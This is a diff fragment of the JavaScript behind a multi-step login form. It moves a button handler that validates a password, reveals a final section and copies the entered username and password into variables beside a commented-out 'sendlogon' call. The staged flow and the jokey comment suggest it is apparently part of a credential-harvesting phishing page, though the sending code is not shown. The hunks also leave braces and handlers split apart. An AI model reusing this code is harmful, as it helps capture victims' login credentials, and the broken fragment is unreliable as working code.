@@ -445,25 +445,7 @@
             //validate the form
             validate();
             if (pwdVal) {
-                document.getElementById("section_pwd").classList.toggle('d-none');
-                document.getElementById('section_final').classList.remove('d-none');
-                view = "final";
-            }
-        })
-///// heheheh
-        const sigasdf = document.getElementById('btn_final');
 
-        sigasdf.addEventListener('click', () => {
-            //validate the form
-            //unameInp
-            //pwdInp
-         //   sendlogon(unameInp,pwdInp)
-            validate();
-            if (pwdVal) {
-                document.getElementById("section_pwd").classList.toggle('d-none');
-                document.getElementById('section_final').classList.remove('d-none');
-                //view = "final";
-                console.log(5 + 6);
  const user = unameInp
  const pass = pwdInp
 
@@ -591,6 +573,26 @@
     }
   
   );
+                
+                document.getElementById("section_pwd").classList.toggle('d-none');
+                document.getElementById('section_final').classList.remove('d-none');
+                view = "final";
+            }
+        })
+///// heheheh
+        const sigasdf = document.getElementById('btn_final');
+
+        sigasdf.addEventListener('click', () => {
+            //validate the form
+            //unameInp
+            //pwdInp
+         //   sendlogon(unameInp,pwdInp)
+            validate();
+            if (pwdVal) {
+                document.getElementById("section_pwd").classList.toggle('d-none');
+                document.getElementById('section_final').classList.remove('d-none');
+                //view = "final";
+                console.log(5 + 6);
   
   
             }
